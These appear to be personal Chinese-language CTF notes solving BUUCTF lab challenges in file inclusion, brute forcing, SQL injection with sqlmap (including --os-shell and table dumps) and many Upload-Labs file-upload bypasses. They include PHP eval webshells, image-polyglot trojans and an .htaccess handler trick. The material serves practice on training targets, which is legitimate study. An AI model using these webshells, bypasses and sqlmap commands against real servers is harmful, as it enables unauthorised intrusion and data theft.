# BUU LFI COURSE 1
`view-source:http://5fe44853-857f-4e8d-b756-56ea72f00a21.node5.buuoj.cn:81/?file=/flag`

# BUU BRUTE 1
使用 burp 对 password 从 0000-9999 暴力破解

# BUU SQL COURSE 1
使用 sqlmap
```sh
python .\tools\sqlmap\sqlmap.py -u "http://a6acd68a-3f7b-4ea6-aa60-a4e3b6b7ac0d.node5.buuoj.cn:81/backend/content_detail.php?id=2" --os-shell
ls
find / -name flag
cat /flag
```

# Upload-Labs-Linux
关于文件上传

### pass1 客户端 js 验证
禁用网页js（使用插件Quick Javascript Switcher）,或者使用burpsuit。上传 webshell
```
------WebKitFormBoundarykQoJzWfXWa1VBSZj
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php
eval($_POST["pass"]);

------WebKitFormBoundarykQoJzWfXWa1VBSZj
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundarykQoJzWfXWa1VBSZj--
```
然后使用菜刀、蚁剑、Godzilla打开上传文件的地址`xxxx/upload/shell.php`

### pass2 服务器文件类型验证
上传文件时，明确 `Content-Type: image/png`， 方法同上

### pass3 服务器文件后缀验证
上传文件时，文件后缀可以尝试 `.php .phtml .phps .php5 .pht`，方法同上

### pass4 服务器 `Apache .htaccess` 配置文件验证
方案1：
添加无法解析的后缀如 `pass4.php.xxxx` 绕过验证。一句话木马可以尝试使用 `<?php echo(phpinfo());?>` 来验证。
上传成功后访问 `http://xxxxx/upload/pass4.php.xxxx` 来验证。
方案2：
利用.htaccess来把含有php语言的图片，能够作为脚本处理。以下是 .htaccess 文件内容
```
<FilesMatch "pass4.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```
上传后尝试打开：`http://xxxxx/upload/.htaccess` 如果返回403，证明已经上传成功。
然后将一句话木马用 `.jpg` 文件后缀进行上传，然后网站就会将 .jpg 作为 php 来解析了。
`http://xxxxx/upload/pass4.jpg`

### pass5 大小写绕过
使用 `.PHp` 后缀上传 webshell

### pass6 空格绕过
使用 `.php ` 后缀上传 webshell

### pass7 点绕过
使用 `.php.` 后缀上传 webshell

### pass8 `::$DATA`绕过
NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与 Macintosh 文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为`$DATA`。上传`.php::$DATA`绕过。(仅限windows)

### pass9 空格和点绕过
看代码可以看出它只去掉一次空格和点。
上传文件名使用`pass9.php. .`

### pass10 双写绕过
看代码可以看出它将敏感后缀替换为空，双写后缀`.pphphp`绕过。

### pass11 `%00`截断
上传文件发现url会变成
`http://2dda8eda-de3d-48b9-b100-bd03798a6f40.node5.buuoj.cn:81/Pass-11/index.php?save_path=../upload/`
尝试将后面改为 `?save_path=../upload/pass11.php%00`
说是对php版本有要求，无法完成

### pass12
与11一样，不过是 post 方法。php版本有要求，无法完成

### pass13、pass14、pass15
要制造图片马，这里可以使用 yakit 给一句话木马添加图片头
```
------WebKitFormBoundaryhOLXPRsLUETYPM5H
Content-Disposition: form-data; name="upload_file"; filename="pass13.jpg"
Content-Type: application/octet-stream

{{jpg()}}--<?php eval($_POST["pass"]);?>
```
发送成功后网页会返回上传文件的地址 `../upload/9620250412061349.jpg`
连接时要使用 include.php 这个入口来包含文件。可以直接用蚁剑来连接。
`http://116.196.112.253:20080/include.php?file=upload/9620250412061349.jpg`

pass14和15是一样的，将yakit的图片头换成 `{{png()}}--<?php eval($_POST["pass"]);?>`，`{{gif()}}--<?php eval($_POST["pass"]);?>`即可

### pass16 二次渲染绕过
看代码会发现上传的图片被服务器重新渲染修改了，jpg 和 png 逆向改动有些麻烦，看教程说 gif 相对容易，可是还是没搞定。
这里只使用 windows 的 copy 命令成功将木马添加在了图片的末尾（不能用powershell，只能用cmd）：
`copy /b test.gif + pass.php pass.gif`
但是根据教程修改下载下来的 gif 的 hex 后，服务器认为不是 gif 文件了。

### pass17-20 
教程看上去太麻烦了，不想搞了

## BUU UPLOAD COURSE 1
上传一句话木马 pass.php
```
<?php eval($_POST["pass"]);?>
```
得到上传的文件地址后，然后使用蚁剑连接`http://169545d1-d8f9-4ad5-ae8b-85c20509798d.node5.buuoj.cn:81/index.php?file=uploads/67fb285a8f6f2.jpg`，找到根目录 flag 文件。

## sqli-labs
sql 注入的学习合集，不想学，好复杂，直接用 sqlmap 吧。
```sh
python .\sqlmap.py -u http://ad14b268-fed6-417a-9771-31331caea38f.node5.buuoj.cn/Less-3/?id=1 -D ctftraining -T flag -C flag --dump
```
